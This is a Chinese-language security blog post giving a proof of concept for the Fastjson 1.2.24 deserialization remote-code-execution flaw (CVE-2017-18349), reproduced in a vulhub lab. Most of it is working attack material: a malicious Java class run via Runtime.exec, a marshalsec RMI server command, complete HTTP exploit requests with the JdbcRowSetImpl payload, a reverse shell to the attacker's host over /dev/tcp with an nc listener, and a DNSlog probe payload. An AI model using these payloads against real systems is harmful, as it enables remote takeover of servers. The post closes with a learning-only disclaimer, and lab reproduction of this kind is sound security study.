---
layout: post
topmost: true
title: Fastjson 远程命令执行的POC
categories: [安全漏洞]
description: Fastjson 远程命令执行的POC

keywords: 安全漏洞, fastjson
---


# 简介


**漏洞描述**
FastJson 库是 Java 的一个 Json 库，其作用是将 Java 对象转换成 json 数据来表示，也可以将 json 数据转换成 Java 对象，使用非常方便，号称是执行速度最快的库。

在 1.2.24 版本的 Fastjson 出现了一个反序列化的漏洞，fastjson 在解析 json 的过程中，支持使用 autoType 来实例化某一个具体的类，并调用该类的 set/get 方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。


# CVE-2017-18349



CVE-2017-18349即Fastjson1.2.24 反序列化漏洞RCE

## 漏洞原理
fastjson在解析json对象时，会使用autoType实例化某一个具体的类，并调用set/get方法访问属性。漏洞出现在Fastjson autoType处理json对象时，没有对@type字段进行完整的安全性验证，我们可以传入危险的类并调用危险类连接远程RMI服务器，通过恶意类执行恶意代码，进而实现远程代码执行漏洞。


**漏洞影响版本**

> 影响版本为 `fastjson < 1.2.25`

## 准备环境


Fastjson <= 1.2.47 远程命令执行漏洞利用工具及方法，以及避开坑点

以下操作均在Ubuntu 18下亲测可用，openjdk需要切换到8，且使用8的javac

- java
  
```
> java -version
openjdk versin "1.8.0_222"

> javac -version
javac 1.8.0_222
```

## 漏洞环境
靶场选择使用vulhub搭建，网址：<https://github.com/vulhub/vulhub>

下载 vulhub ，找到 `fastjson/1.2.24-rce 目录`，使用docker-compose up -d启动环境。


## 漏洞复现

1. 编写恶意类

在攻击机上编写恶意类代码 `TouchFile.java`

```
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
 static {
     try {
         Runtime rt = Runtime.getRuntime();
         String[] commands = {"touch", "/tmp/EDI"};
         Process pc = rt.exec(commands);
         pc.waitFor();
     } catch (Exception e) {
     }
 }
}

```

然后 `javac TouchFile.java `编译一下，生成 `TouchFile.class`

![](https://img-blog.csdnimg.cn/88f9ab49874a40a8988a78f998bb0241.png)

使用 python 起一个http服务 `python -m SimpleHTTPServer 8888`

![](https://img-blog.csdnimg.cn/7a07f6f92925424f984f40dde31d785a.png)

2. 编译并开启RMI服务

- 下载 [marshalsec](https://github.com/mbechler/marshalsec) 项目 

java8 下，使用 maven 构建 `mvn clean package -DskipTests` 生成相应jar包, 打开 target 目录，jar 包会在里面。

![](https://img-blog.csdnimg.cn/b8c45fc54cac4e1e8506e67ff5ab3211.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAQmlnJkJpcmQ=,size_20,color_FFFFFF,t_70,g_se,x_16)


**启动RMI服务，监听 9999端口** ，并制定远程加载类TouchFile.class


```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://攻击机IP:8888/#TouchFile" 9999

```

![](https://img-blog.csdnimg.cn/44f5743c5377421088902a9d0c84f511.png)






### 构建 payload

3. 抓包触发 fastjson 请求
访问 http://靶机:8090/ ，并通过bp抓包

修改请求方式为 `POST`, `Content-Type 改成application/json`，并写入exp，然后发送请求。


```
{
 "b":{
 "@type":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"rmi://攻击机IP:9999/TouchFile",
 "autoCommit":true
 }
}
```

**exp:**

```
POST / HTTP/1.1
Host: 192.168.42.200:8090
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,hr;q=0.8,ru;q=0.7
Cookie: Hm_lvt_bc38887aa5588add05a38704342ad7e8=1646619039; 
Connection: close
Content-Type: application/json
Content-Length: 137

{
 "b":{
 "@type":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"rmi://192.168.42.200:9999/TouchFile",
 "autoCommit":true
 }
}
```

**响应：**

![](https://img-blog.csdnimg.cn/e30d605ff7e146f2a12959ce2561f585.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAQmlnJkJpcmQ=,size_20,color_FFFFFF,t_70,g_se,x_16)


4. 检验结果
   
进入靶机中，发现`创建了/tmp/EDI 文件`攻击成功



## 反弹shell

既然能创建文件，那么也可以反弹shell
修改**恶意类文件 TouchFile.java :**

```
// TouchFile.java
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;
 
public class TouchFile {
   static {
       try {
           Runtime r = Runtime.getRuntime();
           Process p = r.exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/<攻击机器IP>/4444 0>&1"});
           p.waitFor();
       } catch (Exception e) {
           // do nothing
       }
   }
}
```

然后 `javac TouchFile.java `编译一下，生成 `TouchFile.class` 

#### nc 监听:

`攻击机`执行
```al
nc -lvvp 4444

```

访问 FastJson 页面，使用 Burp 抓包，改为 POST 请求，使用 exp 反弹 shell

**exp:**

```
POST / HTTP/1.1
Host: 192.168.42.200:8090
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,hr;q=0.8,ru;q=0.7
Cookie: Hm_lvt_bc38887aa5588add05a38704342ad7e8=1646619039; 
Connection: close
Content-Type: application/json
Content-Length: 137

{
 "b":{
 "@type":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"rmi://192.168.42.200:9999/TouchFile",
 "autoCommit":true
 }
}
```


可以看到请求成功，加载了恶意类,成功拿到 shell




![](https://img-blog.csdnimg.cn/20200720233638849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTU5ODY2MA==,size_16,color_FFFFFF,t_70)


## DNSlog 平台验证
1. [DNSlog平台验证](http://www.dnslog.cn/)
   
（比网上很多payload都要好用，通杀版本）

    payload:

    ```
     {"zeo":{"@type":"java.net.Inet4Address","val":"dnslog的位置"}}
    ```
    ![](https://img-blog.csdnimg.cn/20200722205445187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTU5ODY2MA==,size_16,color_FFFFFF,t_70)

    ![](https://img-blog.csdnimg.cn/20200722205536663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTU5ODY2MA==,size_16,color_FFFFFF,t_70)

## fastjson paylaod 收集

[java.net.URL 函数（实战成功）
](https://github.com/dzxindex/security_script/blob/main/fastjson/fastjson-payload.md)

# 免责声明

[干货｜最全fastjson漏洞复现与绕过
](https://cloud.tencent.com/developer/article/1974944)
仅作为漏洞复现进行学习，切勿对网站进行非法测试